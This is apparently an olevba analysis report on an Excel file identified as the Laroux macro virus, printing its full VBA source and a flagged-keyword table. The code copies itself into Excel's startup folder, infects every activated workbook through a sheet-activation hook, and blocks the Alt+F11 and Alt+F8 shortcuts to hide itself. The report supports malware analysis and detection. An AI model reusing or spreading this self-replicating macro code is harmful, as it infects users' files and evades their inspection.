olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux.ja-c119f5fa6eb73e8f701bb7b5ae301ce1f0403929
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO StartUp.bas 
in file: Virus.MSExcel.Laroux.ja-c119f5fa6eb73e8f701bb7b5ae301ce1f0403929 - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
Application.ScreenUpdating = False
ThisWorkbook.Sheets("StartUp").Copy
ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
n$ = ActiveWorkbook.Name
ActiveWindow.Visible = False
Workbooks("StartUp.xls").Save
Workbooks(n$).Close (False)
End If
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnKey "%{F8}", "StartUp.xls!escape"
Application.ScreenUpdating = True
End Sub
Sub cop()
Attribute cop.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
Application.ScreenUpdating = False
n$ = ActiveSheet.Name
Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)

End If
End Sub
Sub back()
Attribute back.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Application.ScreenUpdating = False
Application.OnKey "%{F8}", "StartUp.xls!escape"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnTime Now + TimeValue("00:00:01"), "StartUp.xls!cop"
Workbooks.Open Application.StartupPath & "\StartUp.xls"
Application.ScreenUpdating = True
End Sub

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, hidden -  Macro
' 0085     15 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  StartU
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - §NÁ
' 0085     17 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Quotatio
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
+----------+--------------------+---------------------------------------------+

